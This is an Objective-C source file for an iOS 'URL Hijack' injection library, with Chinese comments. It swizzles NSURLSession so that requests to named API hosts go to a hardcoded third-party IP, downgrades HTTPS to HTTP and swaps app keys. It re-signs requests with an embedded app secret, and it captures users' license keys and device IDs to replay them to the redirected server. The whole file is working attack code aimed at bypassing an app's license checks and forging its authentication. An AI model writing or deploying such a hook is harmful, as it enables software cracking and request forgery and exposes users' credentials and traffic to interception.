// URLHijackDetector.m
// iOS URL Hijack Dylib - 支持签名重算和卡密提取（修复版）
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>

#pragma mark - 配置区

// 需要处理的目标域名/IP
static NSSet<NSString *> *getTargetDomains(void) {
    return [NSSet setWithArray:@[
        @"api1.7ccccccc.com",
        @"api2.7ccccccc.com", 
        @"api3.7ccccccc.com",
        @"api1.keyumjan.cn",
        @"45.205.27.82:8080"
    ]];
}

// 需要重定向的域名/IP列表（劫持后重定向到新域名）
static NSSet<NSString *> *getRedirectTargets(void) {
    return [NSSet setWithArray:@[
        @"45.205.27.82:8080",
        @"api1.keyumjan.cn"
    ]];
}

// 劫持后重定向的新域名
static NSString *getNewDomain(void) {
    return @"61.184.8.198:5563";
}

// appSecret
static NSString *getAppSecret(void) {
    return @"XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx";
}

// appKey 替换规则
static NSArray<NSDictionary *>* getAppKeyRules(void) {
    return @[
        @{@"old": @"LWtAvVixXX39mGYL2w", @"new": @"QLObIPwnDOVts3mzw9"},
        @{@"old": @"veQ3NZZ5ui0jyBrQaT", @"new": @"QLObIPwnDOVts3mzw9"},
    ];
}

#pragma mark - 持久化存储管理

static NSString *getStorageKey(void) {
    return @"com.hijack.stored_params";
}

static void saveParamsToStorage(NSString *card, NSString *deviceId) {
    if (!card && !deviceId) return;
    
    @synchronized([NSUserDefaults standardUserDefaults]) {
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        NSMutableDictionary *storedParams = [[defaults dictionaryForKey:getStorageKey()] mutableCopy];
        if (!storedParams) {
            storedParams = [NSMutableDictionary dictionary];
        }
        
        if (card) {
            storedParams[@"card"] = card;
        }
        if (deviceId) {
            storedParams[@"device_id"] = deviceId;
        }
        
        [defaults setObject:storedParams forKey:getStorageKey()];
        [defaults synchronize];
    }
}

static NSDictionary *loadParamsFromStorage(void) {
    @synchronized([NSUserDefaults standardUserDefaults]) {
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        return [defaults dictionaryForKey:getStorageKey()];
    }
}

#pragma mark - 加密工具函数

static NSString* md5(NSString *string) {
    if (!string) return @"";
    
    const char *cStr = [string UTF8String];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
    
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return output;
}

#pragma mark - 签名计算

static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
    if (!params) return @"";
    if (!httpMethod) httpMethod = @"POST";
    if (!path) path = @"";
    if (!appSecret) appSecret = @"";
    
    // 1. 参数排序并拼接
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    NSMutableString *paramString = [NSMutableString string];
    
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        
        if (paramString.length > 0) {
            [paramString appendString:@"&"];
        }
        
        NSString *value = params[key] ?: @"";
        [paramString appendFormat:@"%@=%@", key, value];
    }
    
    // 2. 拼接签名原串
    NSString *stringToSign;
    if (host && host.length > 0) {
        NSArray *hostParts = [host componentsSeparatedByString:@":"];
        NSString *cleanHost = hostParts.firstObject ?: host;
        stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                       httpMethod, cleanHost, path, paramString, appSecret];
    } else {
        stringToSign = [NSString stringWithFormat:@"%@%@%@%@", 
                       httpMethod, path, paramString, appSecret];
    }
    
    // 3. MD5
    return md5(stringToSign);
}

#pragma mark - 请求参数修改

// 从URL或Body中提取参数 - 保持原始值，绝不解码
static NSMutableDictionary* extractParamsFromRequest(NSData *body, NSString *urlString) {
    NSMutableDictionary *params = [NSMutableDictionary dictionary];
    
    // 1. 从 body 中提取
    if (body) {
        NSString *bodyString = [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding];
        if (bodyString) {
            NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
            for (NSString *pair in pairs) {
                NSRange range = [pair rangeOfString:@"="];
                if (range.location != NSNotFound) {
                    NSString *key = [pair substringToIndex:range.location];
                    NSString *value = [pair substringFromIndex:range.location + 1];
                    // 保持原始值，绝不解码
                    params[key] = value ?: @"";
                }
            }
        }
    }
    
    // 2. 从 URL 中提取（补充）
    if (urlString) {
        NSURL *url = [NSURL URLWithString:urlString];
        if (url) {
            NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
            for (NSURLQueryItem *item in components.queryItems) {
                if (!params[item.name]) {
                    // 保持原始值
                    params[item.name] = item.value ?: @"";
                }
            }
        }
    }
    
    return params;
}

// 构建新的请求体 - 使用原始值，不做任何编码
static NSData* buildRequestBodyFromParams(NSDictionary *params) {
    if (!params || params.count == 0) return nil;
    
    NSMutableArray *pairs = [NSMutableArray array];
    
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        NSString *value = params[key] ?: @"";
        [pairs addObject:[NSString stringWithFormat:@"%@=%@", key, value]];
    }
    
    if (params[@"sign"]) {
        [pairs addObject:[NSString stringWithFormat:@"sign=%@", params[@"sign"]]];
    }
    
    NSString *bodyString = [pairs componentsJoinedByString:@"&"];
    return [bodyString dataUsingEncoding:NSUTF8StringEncoding];
}

// 处理原始 API 请求
static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
    // 提取所有参数（保持原始值）
    NSMutableDictionary *params = extractParamsFromRequest(originalBody, originalURL);
    if (params.count == 0) return originalBody;
    
    // 提取 card 和 device_id
    NSString *card = params[@"card"];
    NSString *deviceId = params[@"device_id"];
    
    if (card || deviceId) {
        saveParamsToStorage(card, deviceId);
    }
    
    // 替换 appKey
    NSString *currentAppKey = params[@"appKey"];
    if (currentAppKey) {
        NSString *newAppKey = nil;
        NSArray *rules = getAppKeyRules();
        
        for (NSDictionary *rule in rules) {
            if ([rule[@"old"] isEqualToString:currentAppKey]) {
                newAppKey = rule[@"new"];
                break;
            }
        }
        
        if (newAppKey) {
            params[@"appKey"] = newAppKey;
            
            // 重新计算签名
            NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
            if (newSign && newSign.length > 0) {
                params[@"sign"] = newSign;
            }
            
            // 构建新的请求体
            NSData *newBody = buildRequestBodyFromParams(params);
            if (newBody) {
                return newBody;
            }
        }
    }
    
    return originalBody;
}

// 处理重定向后的新 API 请求
static NSData* modifyRequestBodyForNewApi(NSData *originalBody, NSString *originalURL) {
    NSMutableDictionary *params = extractParamsFromRequest(originalBody, originalURL);
    
    NSDictionary *storedParams = loadParamsFromStorage();
    
    if (storedParams) {
        NSString *card = storedParams[@"card"];
        NSString *deviceId = storedParams[@"device_id"];
        
        BOOL modified = NO;
        
        if (card && !params[@"card"]) {
            params[@"card"] = card;
            modified = YES;
        }
        
        if (deviceId && !params[@"device_id"]) {
            params[@"device_id"] = deviceId;
            modified = YES;
        }
        
        if (modified) {
            NSData *newBody = buildRequestBodyFromParams(params);
            if (newBody) {
                return newBody;
            }
        }
    }
    
    return originalBody;
}

#pragma mark - URL 匹配与替换

static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
    NSURL *url = [NSURL URLWithString:originalURLString];
    if (!url) return originalURLString;
    
    NSString *host = url.host;
    if (!host) return originalURLString;
    
    if (outHost) *outHost = host;
    if (outPath) *outPath = url.path ?: @"";
    
    BOOL needsRedirect = NO;
    
    for (NSString *target in getRedirectTargets()) {
        if ([host isEqualToString:target]) {
            needsRedirect = YES;
            break;
        }
        
        if (url.port) {
            NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
            if ([hostWithPort isEqualToString:target]) {
                needsRedirect = YES;
                break;
            }
        }
    }
    
    if (needsRedirect) {
        NSString *newURLString = originalURLString;
        NSString *newDomain = getNewDomain();
        
        if ([originalURLString hasPrefix:@"https://"]) {
            newURLString = [newURLString stringByReplacingOccurrencesOfString:@"https://" 
                                                                   withString:@"http://"];
        }
        
        if (url.port) {
            NSString *oldHostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldHostWithPort 
                                                                   withString:newDomain];
        } else {
            newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
                                                                   withString:newDomain];
        }
        
        if (outHost) *outHost = newDomain;
        
        return newURLString;
    }
    
    return originalURLString;
}

static BOOL isTargetRequest(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return NO;
    
    NSString *host = url.host;
    if (!host) return NO;
    
    for (NSString *target in getTargetDomains()) {
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    
    for (NSString *target in getRedirectTargets()) {
        if ([host isEqualToString:target]) {
            return YES;
        }
        
        if (url.port) {
            NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
            if ([hostWithPort isEqualToString:target]) {
                return YES;
            }
        }
    }
    
    return NO;
}

static BOOL isOriginalApiRequest(NSString *host) {
    if (!host) return NO;
    
    NSSet *targetDomains = getTargetDomains();
    for (NSString *target in targetDomains) {
        if ([target containsString:@":"]) continue;
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    return NO;
}

static BOOL isRedirectTarget(NSString *host) {
    if (!host) return NO;
    
    for (NSString *target in getRedirectTargets()) {
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    return NO;
}

#pragma mark - NSURLSession Hook

@interface NSURLSession (Hijack)
@end

@implementation NSURLSession (Hijack)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [NSURLSession class];
        
        SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
        SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
        
        Method originalMethod = class_getInstanceMethod(class, originalSelector);
        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        
        if (!originalMethod) {
            class_addMethod(class, originalSelector, 
                          imp_implementationWithBlock(^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
                return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
            }), "@@:@?");
            return;
        }
        
        if (!swizzledMethod) {
            class_addMethod(class, swizzledSelector, 
                          imp_implementationWithBlock(^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
                return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
            }), "@@:@?");
            swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        }
        
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

- (NSURLSessionDataTask *)hijacked_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    NSMutableURLRequest *mutableRequest = [request mutableCopy];
    BOOL modified = NO;
    
    if (isTargetRequest(originalURLString)) {
        NSString *host = nil;
        NSString *path = nil;
        
        NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
        if (![newURLString isEqualToString:originalURLString]) {
            NSURL *newURL = [NSURL URLWithString:newURLString];
            if (newURL) {
                [mutableRequest setURL:newURL];
                modified = YES;
            }
        } else {
            NSURL *url = [NSURL URLWithString:originalURLString];
            host = url.host;
            path = url.path ?: @"";
        }
        
        NSData *originalBody = request.HTTPBody;
        if (originalBody && host) {
            NSData *newBody = nil;
            
            if (isOriginalApiRequest(host)) {
                newBody = modifyRequestBodyForOriginalApi(originalBody, originalURLString, request.HTTPMethod, host, path);
            } else if (isRedirectTarget(host) || [host isEqualToString:getNewDomain()] || [host containsString:@"61.184.8.198"]) {
                newBody = modifyRequestBodyForNewApi(originalBody, originalURLString);
            }
            
            if (newBody && newBody != originalBody) {
                [mutableRequest setHTTPBody:newBody];
                
                NSString *contentLength = [NSString stringWithFormat:@"%lu", (unsigned long)newBody.length];
                [mutableRequest setValue:contentLength forHTTPHeaderField:@"Content-Length"];
                modified = YES;
            }
        }
    }
    
    if (!modified) {
        return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
    }
    
    return [self hijacked_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
}

@end

__attribute__((constructor))
static void initialize() {
    // 初始化时不输出日志
}
